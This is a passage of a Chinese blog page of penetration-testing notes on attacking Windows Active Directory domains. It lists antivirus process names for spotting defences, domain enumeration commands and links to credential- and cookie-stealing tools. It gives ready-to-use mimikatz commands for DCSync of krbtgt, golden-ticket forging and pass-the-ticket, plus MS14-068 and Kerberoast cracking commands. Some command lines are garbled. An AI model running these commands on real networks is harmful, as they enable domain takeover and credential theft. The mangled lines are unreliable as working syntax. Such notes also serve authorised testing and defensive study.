class="line">&#123;&quot;vsmon.exe&quot;,   &quot;ZoneAlarm&quot;&#125;,</span><br><span class="line">&#123;&quot;avp.exee&quot;,   &quot;Kaspersky&quot;&#125;,</span><br><span class="line">&#123;&quot;cpf.exe&quot;,   &quot;Comodo&quot;&#125;,</span><br><span class="line">&#123;&quot;outpost.exe&quot;,   &quot;Outpost Firewall&quot;&#125;,</span><br><span class="line">&#123;&quot;rfwmain.exe&quot;,   &quot;瑞星防火墙&quot;&#125;,</span><br><span class="line">&#123;&quot;kpfwtray.exe&quot;,   &quot;金山网镖&quot;&#125;,</span><br><span class="line">&#123;&quot;FYFireWall.exe&quot;,   &quot;风云防火墙&quot;&#125;,</span><br><span class="line">&#123;&quot;MPMon.exe&quot;,   &quot;微点主动防御&quot;&#125;,</span><br><span class="line">&#123;&quot;pfw.exe&quot;,   &quot;天网防火墙&quot;&#125;,</span><br><span class="line">&#123;&quot;S.exe&quot;,   &quot;在抓鸡&quot;&#125;,</span><br><span class="line">&#123;&quot;1433.exe&quot;,   &quot;在扫1433&quot;&#125;,</span><br><span class="line">&#123;&quot;DUB.exe&quot;,   &quot;在爆破&quot;&#125;,</span><br><span class="line">&#123;&quot;ServUDaemon.exe&quot;,   &quot;发现S-U&quot;&#125;,</span><br><span class="line">&#123;&quot;BaiduSdSvc.exe&quot;,   &quot;百度杀软&quot;&#125;,</span><br><span class="line"></span><br><span class="line">安全狗：</span><br><span class="line">SafeDogGuardCenter.exe</span><br><span class="line">safedogupdatecenter.exe</span><br><span class="line">safedogguardcenter.exe</span><br><span class="line">SafeDogSiteIIS.exe</span><br><span class="line">SafeDogTray.exe</span><br><span class="line">SafeDogServerUI.exe</span><br><span class="line"></span><br><span class="line">D盾：</span><br><span class="line">D_Safe_Manage.exe</span><br><span class="line">d_manage.exe</span><br><span class="line"></span><br><span class="line">云锁：</span><br><span class="line">yunsuo_agent_service.exe</span><br><span class="line">yunsuo_agent_daemon.exe</span><br><span class="line"></span><br><span class="line">护卫神：</span><br><span class="line">HwsPanel.exe  护卫神·入侵防护系统（状态托盘）</span><br><span class="line">hws_ui.exe   护卫神·入侵防护系统</span><br><span class="line">hws.exe    护卫神·入侵防护系统 服务处理程序</span><br><span class="line">hwsd.exe    护卫神·入侵防护系统 监控组件</span><br><span class="line"></span><br><span class="line">火绒：</span><br><span class="line">hipstray.exe</span><br><span class="line">wsctrl.exe</span><br><span class="line">usysdiag.exe</span><br><span class="line"></span><br><span class="line">趋势科技：</span><br><span class="line">TMBMSRV.exe</span><br><span class="line">ntrtscan.exe</span><br><span class="line">PCCNTMON.exe</span><br><span class="line">TMLISTEN.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="自动收集信息"><a href="#自动收集信息" class="headerlink" title="自动收集信息"></a>自动收集信息</h3><p>WMIC（Windows管理工具命令行）。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，Windows 7以上版本的低权限用户允许访问WMIC并执行相关查询操作。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
+<p>执行完脚本后，会将所有结果写入一个HTML文件中。</p>
+<h3 id="Empire下的主机信息收集"><a href="#Empire下的主机信息收集" class="headerlink" title="Empire下的主机信息收集"></a>Empire下的主机信息收集</h3><p>Empire提供了用于收集主机信息的模块。输入命令：</p>
+<p>usemodule situational_awareness&#x2F;host&#x2F;winenum</p>
+<p>empire下载地址：<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire.git">https://github.com/EmpireProject/Empire.git</a></p>
+<h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><h3 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h3><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">共有以下三种情况：</span><br><span class="line"></span><br><span class="line">&gt; 本地普通用户：只能查询本机相关信息，不能查询域内信息。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 本地管理员用户：可以查询域内信息。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 域内用户：可以查询域内信息。</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="获取域SID"><a href="#获取域SID" class="headerlink" title="获取域SID"></a>获取域SID</h3><h2 id="获取当前用户密码"><a href="#获取当前用户密码" class="headerlink" title="获取当前用户密码"></a>获取当前用户密码</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h3><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/peewpw/Invoke-WCMDump">Invoke-WCMDump</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/giMini/mimiDbg">mimiDbg</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></p>
+<p><a target="_blank" rel="noopener" href="http://launcher.nirsoft.net/downloads/">NirLauncher</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">quarkspwdump</a></p>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h3><p><a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">mimipenguin</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></p>
+<h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a><strong>浏览器</strong></h3><p><a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hayasec/360SafeBrowsergetpass">360SafeBrowsergetpass</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/BrowserGhost/">BrowserGhost</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/DeEpinGh0st/Browser-cookie-steal">Browser-cookie-steal(窃取浏览器cookie)</a></p>
+<h3 id="Navicat密码"><a href="#Navicat密码" class="headerlink" title="Navicat密码"></a><strong>Navicat密码</strong></h3><p>版本：Navicat 11或12</p>
+<p>方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CCESARE/article/details/104746596">https://blog.csdn.net/CCESARE/article/details/104746596</a></p>
+<p>解密脚本：<a target="_blank" rel="noopener" href="https://github.com/tianhe1986/FatSmallTools">https://github.com/tianhe1986/FatSmallTools</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/HyperSine/how-does-navicat-encrypt-password">https://github.com/HyperSine/how-does-navicat-encrypt-password</a></p>
+<p><strong>xshell&amp;xftp密码</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dzxs/Xdecrypt">https://github.com/dzxs/Xdecrypt</a></p>
+<p><strong>mRemoteNG密码</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/kmahyyg/mremoteng-decrypt">https://github.com/kmahyyg/mremoteng-decrypt</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/haseebT/mRemoteNG-Decrypt">https://github.com/haseebT/mRemoteNG-Decrypt</a></p>
+<h2 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a><strong>常见信息收集命令</strong></h2><p>ipconfig：</p>
+<p><code>ipconfig /all ------&gt; 查询本机 IP 段，所在域等</code></p>
+<p>net:</p>
+<p><code>net user ------&gt; 本机用户列表  net localgroup administrators ------&gt; 本机管理员[通常含有域用户]  net user /domain ------&gt; 查询域用户  net group /domain ------&gt; 查询域里面的工作组  net group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组  net localgroup administrators /domain ------&gt; 登录本机的域管理员  net localgroup administrators workgroup\user001 /add -----&gt;域用户添加到本机 net  group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)  net view ------&gt; 查询同一域内机器列表 net view /domain ------&gt; 查询域列表  net view /domain:domainname</code></p>
+<p>dsquery:</p>
+<p><code>dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain  computers&quot; /domain ------&gt; 列出该域内所有机器名  dsquery user domainroot -limit 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名  dsquery subnet ------&gt;列出该域内网段划分  dsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组  dsquery ou ------&gt;列出该域内组织单位   dsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器</code></p>
+<h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><h4 id="psloggedon-exe"><a href="#psloggedon-exe" class="headerlink" title="psloggedon.exe"></a>psloggedon.exe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe</span><br><span class="line"></span><br><span class="line">下载链接 https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</span><br><span class="line"></span><br><span class="line">此工具用于查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户</span><br><span class="line"></span><br><span class="line">psloggedon.exe [-] [-l] [-x] [\\computername或username]</span><br><span class="line"></span><br><span class="line">常用参数有：</span><br><span class="line"></span><br><span class="line">-：显示支持的选项和用于输出的单位</span><br><span class="line">-1：仅显示本地登录不显示本地和网络资源登录</span><br><span class="line">-x：不显示登录时间</span><br><span class="line">\computer：指定要列出登录信息的计算机名称</span><br><span class="line">username：指定用户名，在网络中搜索该用户登录的计算机</span><br><span class="line"></span><br><span class="line">\\后面接的是域控机器名，看一下登录过域控的用户名</span><br><span class="line"></span><br><span class="line">如果\\接的是用户名，那就会搜索网上邻居的计算机，并显示当前用户是否已经登录</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="pvefinaduser-exe"><a href="#pvefinaduser-exe" class="headerlink" title="pvefinaduser.exe"></a>pvefinaduser.exe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">下载链接 https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</span><br><span class="line"></span><br><span class="line">功能也是查找域用户位置、某计算机上登录用户。运行需要计算机支持framework2.0且以管理员权限运行</span><br><span class="line"></span><br><span class="line">直接pvefinaduser.exe -current，一把梭，即可查看域中所有计算机的登录用户</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="netview-exe"><a href="#netview-exe" class="headerlink" title="netview.exe"></a>netview.exe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">工具下载地址：https://github.com/mubix/netview</span><br><span class="line"></span><br><span class="line">netview.exe 是一个枚举工具，使用WinAPI枚举系统、利用NetSessionEnum 找寻登录会话利用NetShareEnum 找寻共享，利用NerWkstaUserEnum 枚举登录的用户。同时，netview.exe 能够查询共享入口和有价值的用户。绝大部分功能不需要管理员权限。</span><br><span class="line"></span><br><span class="line">常用参数：</span><br><span class="line"></span><br><span class="line">-f filename.txt：指定要提取主机名列表的文件</span><br><span class="line">-e filename.txt：指定要排除的主机名的文件</span><br><span class="line">-o filename.txt：将所有输出重定向到指定文件</span><br><span class="line">-d domain：指定要提取主机列表的域。如果没有指定，则从当前域中提取</span><br><span class="line">-g group：指定搜索的组名。如果没有指定，则在Domain Admins组中搜索</span><br><span class="line">-c：对已找到的共享目录/文件的访问权限进行检查</span><br></pre></td></tr></table></figure>
+
+<h4 id="Namp的NSE脚本"><a href="#Namp的NSE脚本" class="headerlink" title="Namp的NSE脚本"></a>Namp的NSE脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">工具下载地址：https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</span><br><span class="line"></span><br><span class="line">如果存在域账户或者本地账户就可以使用Nmap的smb-enum-sessions.nes引擎获取远程机器的登录会话。</span><br><span class="line"></span><br><span class="line">常用参数：</span><br><span class="line"></span><br><span class="line">smb-enum-domain：对域控制器进行信息收集，可以获取主机的信息、用户、可使用密码策略的用户等</span><br><span class="line">smb-enum-users：在进行域渗透测试时，如果获得了域内某台主机的权限，无法获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描</span><br><span class="line">smb-enum-shares：遍历远程主机的共享目录</span><br><span class="line">smb-enum-processes：对主机的系统进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。</span><br><span class="line">smb-enum-sessions：获取域内主机的用户登录会话，查看当前是否有用户登录。</span><br><span class="line">smb-os-discovery：收集目标主机的操作系统、计算机名、域名域林名称、NetBIOS机器名、NetBIOS域名，工作组、系统时间等信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="PowerView-PS1脚本"><a href="#PowerView-PS1脚本" class="headerlink" title="PowerView.PS1脚本"></a>PowerView.PS1脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">工具下载地址：https://github.com/PowerShellEmpirc/PowerTools/tree/master/PowerView</span><br><span class="line"></span><br><span class="line">powerview脚本可以用来获取当前域管理员在线登录的服务器</span><br><span class="line"></span><br><span class="line">Invoke-UserHunter：搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。它可以使用 Get-NetSessions 和Get-NetLoggedon 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限。</span><br><span class="line"></span><br><span class="line">打开powershell，进入脚本目录，输入Import-Module .\PowerView.ps1 导入脚本</span><br><span class="line"></span><br><span class="line">然后输入Invoke-UserHunter即可</span><br><span class="line"></span><br><span class="line">详细使用方法如下：</span><br><span class="line"></span><br><span class="line">Import-Module为powershell导入脚本命令，这里假设我们下载的powerview.ps1脚本在C:\PowerView.ps1</span><br><span class="line">命令格式：powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerview的命令参数&#125;&quot;</span><br><span class="line"></span><br><span class="line">定位域管理员</span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; Invoke-UserHunter&#125;&quot;</span><br><span class="line"></span><br><span class="line">更多PowerView命令参数</span><br><span class="line"></span><br><span class="line">Get-NetDomain: 获取当前用户所在域的名称</span><br><span class="line">Get-NetUser: 获取所有用户的详细信息</span><br><span class="line">Get-NetDomainController: 获取所有域控制器的信息</span><br><span class="line">Get-NetComputer: 获取域内所有机器的详细信息</span><br><span class="line">Get-NetOU: 获取域中的OU信息</span><br><span class="line">Get-NetGroup: 获取所有域内组和组成员信息</span><br><span class="line">Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息</span><br><span class="line">Get-NetShare: 获取当前域内所有网络共享信息</span><br><span class="line">Get-NetSession: 获取指定服务器的会话</span><br><span class="line">Get-NetRDPSession: 获取指定服务器的远程连接</span><br><span class="line">Get-NetProcess: 获取远程主机的进程</span><br><span class="line">Get-UserEvent: 获取指定用户的日志</span><br><span class="line">Get-ADObiect: 获取活动目录的对象</span><br><span class="line">Get-NetGPO: 获取域内所有的组策略对象</span><br><span class="line">Get-DomainPolicy: 获取域默认策略或域控制器策略</span><br><span class="line">Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限</span><br><span class="line">Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户</span><br><span class="line">Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。</span><br></pre></td></tr></table></figure>
+
+<h4 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。</span><br><span class="line"></span><br><span class="line">大部分win系统默认已自带spn探测工具即：setspn.exe</span><br><span class="line"></span><br><span class="line">此操作无需管理权限</span><br><span class="line"></span><br><span class="line">域内机器执行</span><br><span class="line"></span><br><span class="line">setspn -T 域名 -Q */*</span><br><span class="line"></span><br><span class="line">即可完整查出当前域内所有spn。</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取域控的方法"><a href="#获取域控的方法" class="headerlink" title="获取域控的方法"></a>获取域控的方法</h2><h3 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a><strong>SYSVOL</strong></h3><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol</p>
+<p>文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会</p>
+<p>复制到域中所有DC上。 相关阅读:</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/blank">寻找SYSVOL里的密码和攻击GPP（组策略偏好）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/ycrsjxy/203095">Windows Server 2008 R2之四管理Sysvol文件夹</a></p>
+<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2288">SYSVOL中查找密码并利用组策略首选项</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1653">利用SYSVOL还原组策略中保存的密码</a></p>
+<h3 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h3><p><code>python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</code></p>
+<p>利用mimikatz将工具得到的<a href="mailto:&#84;&#x47;&#84;&#95;&#100;&#111;&#x6d;&#x61;&#105;&#x6e;&#117;&#115;&#x65;&#114;&#64;&#83;&#69;&#82;&#86;&#69;&#x52;&#x2e;&#x43;&#79;&#77;&#46;&#x63;&#x63;&#97;&#99;&#x68;&#101;">&#84;&#x47;&#84;&#95;&#100;&#111;&#x6d;&#x61;&#105;&#x6e;&#117;&#115;&#x65;&#114;&#64;&#83;&#69;&#82;&#86;&#69;&#x52;&#x2e;&#x43;&#79;&#77;&#46;&#x63;&#x63;&#97;&#99;&#x68;&#101;</a>写入内存，创建缓存证书：</p>
+<p>mimikatz.exe “kerberos::ptc c:<a href="mailto:&#84;&#x47;&#84;&#x5f;&#x64;&#97;&#114;&#116;&#x68;&#115;&#x69;&#x64;&#x69;&#111;&#x75;&#115;&#x40;&#x70;&#x65;&#110;&#116;&#x65;&#x73;&#116;&#x2e;&#99;&#111;&#109;&#x2e;&#99;&#x63;&#97;&#x63;&#104;&#x65;">&#84;&#x47;&#84;&#x5f;&#x64;&#97;&#114;&#116;&#x68;&#115;&#x69;&#x64;&#x69;&#111;&#x75;&#115;&#x40;&#x70;&#x65;&#110;&#116;&#x65;&#x73;&#116;&#x2e;&#99;&#111;&#109;&#x2e;&#99;&#x63;&#97;&#x63;&#104;&#x65;</a>“ exit</p>
+<p>net use k: \pentest.comc$</p>
+<p>相关阅读 :</p>
+<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=676">Kerberos的工具包PyKEK</a></p>
+<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=676">深入解读MS14-068漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=541">Kerberos的安全漏洞</a></p>
+<h3 id="SPN扫描-1"><a href="#SPN扫描-1" class="headerlink" title="SPN扫描"></a>SPN扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向</span><br><span class="line"></span><br><span class="line">目标系统发送任何数据包。 SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，</span><br><span class="line"></span><br><span class="line">主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或</span><br><span class="line"></span><br><span class="line">LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域</span><br><span class="line"></span><br><span class="line">用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。 SPN扫描的主要好处是，SPN扫描不需</span><br><span class="line"></span><br><span class="line">要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是</span><br><span class="line"></span><br><span class="line">Kerberos的票据行为一部分，因此比较难检测SPN扫描。 相关阅读 :</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/network-penetration-testing/locate-and-attack-domain-sql-servers-without-scanning/">非扫描式的SQL Server发现</a></p>
+<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1508">SPN扫描</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">扫描SQLServer的脚本</a></p>
+<h2 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h2><p>在域上抓取的哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:pentest.com /user:krbtgt</span><br><span class="line"></span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值</span><br><span class="line"></span><br><span class="line">/ticket:adinistrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::tgt</span><br><span class="line"></span><br><span class="line">net use k: \pnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85606">域服务账号破解实践</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wulantian/article/details/42418231">Kerberos的认证原理</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cxzhq2002/article/details/80938770">深刻理解windows安全认证机制ntlm＆Kerberos</a></p>
+<h2 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">黄金票据和白银票据的一些区别： Golden Ticket：伪造 TGT ，可以获取 任何Kerberos 服务权限 银票：</span><br><span class="line"></span><br><span class="line">伪造TGS， 只能访问指定的服务 加密方式不同： Golden Ticket由 krbtgt 的hash加密 Silver Ticket由 服</span><br><span class="line"></span><br><span class="line">务账号 （通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用</span><br><span class="line"></span><br><span class="line">的过程不需要同域控通信 相关阅读 :</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2011">攻击者如何使用</a>Kerberos的银票来利用系统</p>
+<p><a target="_blank" rel="noopener" href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf">域渗透——Pass The Ticket</a></p>
+<h2 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a><strong>域服务账号破解</strong></h2><p>与上面SPN扫描类似的原理 <a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> 获取所有用作SPN的帐户</p>
+<p><code>setspn -T PENTEST.com -Q */*</code></p>
+<p>从Mimikatz的RAM中提取获得的门票</p>
+<p><code>kerberos::list /export</code></p>
+<p>用rgsrepcrack破解</p>
+<p><code>tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-</code></p>
+<p><code>MYDOMAIN.LOCAL.kirbi</code></p>
+<p><strong>凭证盗窃</strong></p>
+<p>从搜集的密码里面找管理员的密码</p>
+<p><strong>NTLM relay</strong></p>
+<p><a target="_blank" rel="noopener" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">One API call away from Domain Admin</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/privexchange/">privexchange</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ridter/exchange2domain">Exchange2domain</a></p>
+<p>用于主动让目标机器发起NTLM请求的方法：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">PetitPotam</a></p>
+<p>Relay LDAP:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2019-1040-dcpwn">CVE-2019-1040-dcpwn</a></p>
+<p>Relay AD CS&#x2F;PKI:</p>
+<p><a target="_blank" rel="noopener" href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/">AD CS&#x2F;PKI template exploit</a></p>
+<p>集成几个利用的工具：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/Relayx">Relayx</a></p>
+<p>内网445端口转发：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/praetorian-inc/PortBender">PortBender</a></p>
+<h2 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h2><p><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging-the-Dog.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">s4u2pwnage</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a></p>
+<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=4056">用打印服务获取域控</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">Computer Takeover</a></p>
+<p><a target="_blank" rel="noopener" href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">Combining NTLM Relaying and Kerberos delegation</a></p>
+<p><a target="_blank" rel="noopener" href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">CVE-2019-1040</a></p>
 
                 
                 <p class="end">__END__</p>
